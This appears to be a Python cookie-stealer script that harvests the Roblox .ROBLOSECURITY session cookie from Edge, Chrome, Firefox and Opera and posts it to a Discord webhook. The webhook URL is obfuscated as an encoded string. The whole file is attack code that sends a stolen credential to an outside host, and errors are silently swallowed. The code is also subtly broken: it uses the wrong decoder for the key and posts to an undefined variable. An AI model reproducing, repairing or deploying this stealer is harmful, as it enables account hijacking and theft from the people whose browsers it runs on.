import browser_cookie3, requests, threading
import base64
import time
import os





key = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvODMyMDUwMDQwMjg5MDk5ODQ3L0hrbnd0UktRY19xQnNYbDNTLVV0cEdqYnJXVl84ZzBRUU15VVRkUm9WTmRzRDllSVFxeDFoVUlnUnN6ZFBZa2FxWWI0"

weblook = base64.b32decode(key)

def edge_logger():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass

def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass

def firefox_logger():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass

def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
    except:
        pass

browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]

for x in browsers:
    threading.Thread(target=x,).start()
